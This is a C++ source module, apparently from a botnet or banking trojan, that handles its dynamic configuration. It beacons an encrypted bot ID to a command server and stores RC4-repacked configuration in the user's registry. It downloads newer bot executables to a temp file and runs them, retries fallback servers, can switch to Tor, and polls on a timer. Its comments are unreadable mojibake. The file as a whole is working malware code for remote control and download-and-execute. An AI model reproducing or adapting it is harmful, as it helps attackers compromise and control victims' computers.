#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <shlwapi.h>
#include <ws2tcpip.h>

#include "defines.h"
#include "core.h"
#include "corehook.h"
#include "dynamicconfig.h"
#include "cryptedstrings.h"
#include "sockethook.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\debug.h"
#include "..\common\registry.h"
#include "..\common\fs.h"
#include "..\common\process.h"
#include "..\common\sync.h"
#include "report.h"
#include "..\common\httptools.h"
#include "..\common\wsocket.h"

static WCHAR registryKey[CORE_REGISTRY_KEY_BUFFER_SIZE];
static WCHAR registryValue[CORE_REGISTRY_VALUE_BUFFER_SIZE];

static void initRegistry(void)
{
  if(registryKey[0] == 0)Core::getRegistryValue(Core::RV_DYNAMICCONFIG, registryKey, registryValue);
}

bool newDownloader(LPSTR url, MEMDATA* memData)
{
	Crypt::RC4KEY rc4Key;
	BinStorage::STORAGE *postData = NULL;
	DWORD size;
	HttpTools::URLDATA ud;
	LPSTR fileName = Str::_findRCharA(url, '|') + 1;
	
	*(fileName - 1) = 0;
	bool ok=false;

	{
		BASECONFIG baseConfig;
		Core::getBaseConfig(&baseConfig);
		Mem::_copy(&rc4Key, &baseConfig.baseKey, sizeof(Crypt::RC4KEY));
	}
	Report::addBasicInfo(&postData, Report::BIF_BOT_ID);
	BinStorage::_addItemAsUtf8StringA(&postData, SBCID_REQUEST_FILE, BinStorage::ITEMF_COMBINE_OVERWRITE, fileName);
	
	if((size = BinStorage::_pack(&postData, BinStorage::PACKF_FINAL_MODE, &rc4Key)) > 0)
	{
		WDEBUG0(WDDT_INFO, "Passed upd 1");
		if(HttpTools::_parseUrl(url, &ud))
		{
			WDEBUG0(WDDT_INFO, "Passed upd 2");

			HINTERNET serverHandle = Wininet::_Connect(coreData.httpUserAgent, ud.host, ud.port, GetTickCount() % 2 == 0 ? Wininet::WICF_USE_IE_PROXY : 0);
			if(!serverHandle) {Mem::free(postData);WDEBUG1(WDDT_INFO, "Can't connect to host: %s", ud.host);return false;}
			
			DWORD requestFlags = Wininet::WISRF_METHOD_POST | Wininet::WISRF_KEEP_CONNECTION;

			HINTERNET requestHandle = Wininet::_SendRequest(serverHandle, ud.uri, NULL, postData, size, requestFlags);
			if(!requestHandle) {Mem::free(postData);WDEBUG1(WDDT_INFO, "Can't send request: %s", ud.uri);return false;}
			if(/*DownloadFile(coreData.httpUserAgent, ud.host, ud.port, memData, postData, size)*/Wininet::_DownloadData(requestHandle, memData, 0, coreData.globalHandles.stopEvent))
			{
				WDEBUG0(WDDT_INFO, "Downloaded");
				ok = true;
			}
			InternetCloseHandle(requestHandle);
			Wininet::_CloseConnection(serverHandle);
			Mem::free(postData);
		}
	}
	return ok;
}

void DynamicConfig::init(void)
{
  registryKey[0] = 0;
}

void DynamicConfig::uninit(void)
{

}

BinStorage::STORAGE *DynamicConfig::getCurrent(void)
{
  void *data;
  DWORD dataSize;

  //������� ������������� ������.
  {
    DWORD type;

    initRegistry();
    if((dataSize = Registry::_getValueAsBinaryEx(HKEY_CURRENT_USER, registryKey, registryValue, &type, &data)) == (DWORD)-1)return NULL;
    if(type != REG_BINARY)
    {
      Mem::free(data);
      return NULL;
    }
  }
  
  //�������� ������.
  {
    PESETTINGS pes;
    Core::getPeSettings(&pes);
  
    if(BinStorage::_unpack(NULL, data, dataSize, &pes.rc4Key) == 0)
    {
      Mem::free(data);
      return NULL;
    }
  }
  return (BinStorage::STORAGE *)data;
}

/*
  �������� ����������� ����, ��������� ������ �� ������� ������������.

  IN force - ����������� ���������� ����, ����������� �� ������.

  Return   - true - ���������� ������� ��������,
             false - ��������� ������.
*/
static bool tryToUpdateBot(bool force)
{
  bool retVal = false;;
  BinStorage::STORAGE *currentConfig = DynamicConfig::getCurrent();
  if(currentConfig != NULL)
  {
    DWORD version;
    if(BinStorage::_getItemDataAsDword(currentConfig, CFGID_LAST_VERSION, BinStorage::ITEMF_IS_OPTION, &version) &&
       (version > BO_CLIENT_VERSION || (force == true && version >= BO_CLIENT_VERSION)))
    {
      LPSTR url = (LPSTR)BinStorage::_getItemDataEx(currentConfig, CFGID_LAST_VERSION_URL, BinStorage::ITEMF_IS_OPTION, NULL);
      if(url != NULL)
      {
        WCHAR tempFile[MAX_PATH];
        LPWSTR ext = FILEEXTENSION_EXECUTABLE;
        if(Fs::_createTempFileEx(NULL, ext + 1, tempFile))
        {
          WDEBUG2(WDDT_INFO, "\"%S\" => \"%s\".", url, tempFile);
		  MEMDATA memData;
		  
          if(newDownloader(url, &memData) && Fs::_saveToFile(tempFile,memData.data,memData.size))
          {
            DWORD pid = Process::_createEx(tempFile, force ? L"-f" : NULL, NULL, NULL, NULL);
#           if(BO_DEBUG > 0)
            if(pid == 0)WDEBUG0(WDDT_ERROR, "Failed to run new version of bot.");
            else WDEBUG1(WDDT_INFO, "PID of new bot is %u.", pid);
#           endif
            if(pid != 0)retVal = true;
          }
#         if(BO_DEBUG > 0)
          else WDEBUG0(WDDT_ERROR, "Failed to download the bot.");
#         endif

          Fs::_removeFile(tempFile);
        }
        Mem::free(url);
      }
    }
    Mem::free(currentConfig);
  }
  return retVal;
}

enum
{
  UCF_FORCEUPDATE = 0x1, //����������� ���������� ����, ����������� �� ������.
};

/*
  ����������� ������������ � ����.

  IN baseConfig - ������� ������������.
  IN OUT md     - ������ ��������� �� �������. .
  IN flags      -  UCF_*.

  Return        - true - ������ ������� ���������,
                  false - �� ������� �������� ������.
*/
static bool updateConfig(BASECONFIG *baseConfig, MEMDATA *md, DWORD flags)
{

	WDEBUG0(WDDT_INFO, "UPDATECONFIG CALLED");
  bool retVal = false;
  if(md->data != NULL &&
     (md->size = BinStorage::_unpack(NULL, md->data, md->size, &baseConfig->baseKey)) != 0 &&
     BinStorage::_getItemDataAsDword((BinStorage::STORAGE *)md->data, CFGID_LAST_VERSION, BinStorage::ITEMF_IS_OPTION, NULL))
  {
    WDEBUG0(WDDT_INFO, "Configuration unpacked.");
    
    //��������� ������������.
    {
      PESETTINGS pes;
      DWORD type;

      initRegistry();
      Core::getPeSettings(&pes);

      if((md->size = BinStorage::_pack((BinStorage::STORAGE **)&md->data, BinStorage::PACKF_FINAL_MODE, &pes.rc4Key)) == 0 ||
         Registry::_setValueAsBinary(HKEY_CURRENT_USER, registryKey, registryValue, REG_BINARY, md->data, md->size) == false)
      {
        WDEBUG0(WDDT_ERROR, "Failed to repack configuration.");
      }
      else
      {
        retVal = true;
        tryToUpdateBot(flags & UCF_FORCEUPDATE);
      }
    }
  }
  return retVal;
}



bool DynamicConfig::download(LPSTR url)
{
#if defined USE_TOR
	SocketHook::enableTorMode(true);
#endif
  bool ok = false;
  MEMDATA memData;
  BASECONFIG baseConfig;
  Core::getBaseConfig(&baseConfig);
  LPSTR currentUrl = url == NULL ? baseConfig.defaultConfig : url;

  //�������� ��������� ����������� ������.
  WDEBUG1(WDDT_INFO, "Trying download config \"%S\".", currentUrl);
  if(newDownloader(currentUrl, &memData))
  {
    if(updateConfig(&baseConfig, &memData, url == NULL ? 0 : UCF_FORCEUPDATE))ok = true;
    Mem::free(memData.data);
  }

  //���� �� ��� ������ ���������� URL, ������ � ���� �� ������ �������� ��������.
  if(ok == false && url == NULL)
  {
    WDEBUG0(WDDT_INFO, "Failed.");

    BinStorage::STORAGE *currentConfig = getCurrent();

    if(currentConfig != NULL)
    {
      DWORD size;
      LPSTR configUrlsList = (LPSTR)BinStorage::_getItemDataEx(currentConfig, CFGID_URL_ADV_SERVERS, BinStorage::ITEMF_IS_OPTION, &size);
      Mem::free(currentConfig);

      if(Str::_isValidMultiStringA(configUrlsList, size))
      {
        currentUrl = configUrlsList;
        do
        {
          //�������� ����� ���������.
          if(CWA(kernel32, WaitForSingleObject)(coreData.globalHandles.stopEvent, 10000) != WAIT_TIMEOUT)break;

          //��������.
          WDEBUG1(WDDT_INFO, "Trying download \"%S\".", currentUrl);
          
          if(newDownloader(currentUrl, &memData))
          {
            if(updateConfig(&baseConfig, &memData, 0))ok = true;
            Mem::free(memData.data);
          }
#         if(BO_DEBUG > 0)
          if(!ok)WDEBUG0(WDDT_INFO, "Failed.");
#         endif
        }
        while(!ok && (currentUrl = Str::_multiStringGetIndexA(currentUrl, 1)));
      }
      Mem::free(configUrlsList);
    }
  }

#if(BO_DEBUG > 0)  
  if(ok)WDEBUG0(WDDT_INFO, "Downloaded.");
  else WDEBUG0(WDDT_INFO, "Failed.");
#endif
#if defined USE_TOR
	SocketHook::enableTorMode(false);
#endif
  return ok;
	
}

static DWORD WINAPI proc(void *)
{
  CoreHook::disableFileHookerForCurrentThread(true);
  HANDLE mutex = Core::waitForMutexOfObject(Core::OBJECT_ID_DYNAMIC_CONFIG, MalwareTools::KON_GLOBAL);
  if(mutex == NULL)
  {
    WDEBUG0(WDDT_ERROR, "Failed");
    return 1;
  }

  WDEBUG0(WDDT_INFO, "Started.");

  //������� ����� ��������.
  DWORD normalDelay;
  DWORD errorDelay;
  DWORD delay;
  
  {
    BASECONFIG baseConfig;
    Core::getBaseConfig(&baseConfig);
  
    normalDelay = HIWORD(baseConfig.delayConfig) * 60 * 1000;
    errorDelay  = LOWORD(baseConfig.delayConfig) * 60 * 1000;
  
    Mem::_zero(&baseConfig, sizeof(BASECONFIG));
  }
  
  //����.
  if(Core::isActive())
  {
    WDEBUG2(WDDT_INFO, "normalDelay=%u, errorDelay=%u", normalDelay, errorDelay);
    do
    {
      delay = DynamicConfig::download(NULL) ? normalDelay : errorDelay;
    }
    while(CWA(kernel32, WaitForSingleObject)(coreData.globalHandles.stopEvent, delay) == WAIT_TIMEOUT);
  }
  
  WDEBUG0(WDDT_INFO, "Stopped.");
  Sync::_freeMutex(mutex);

  return 0;
}

bool DynamicConfig::create(ThreadsGroup::GROUP *group)
{
  return ThreadsGroup::_createThread(group, 0, proc, NULL, NULL, NULL);
}
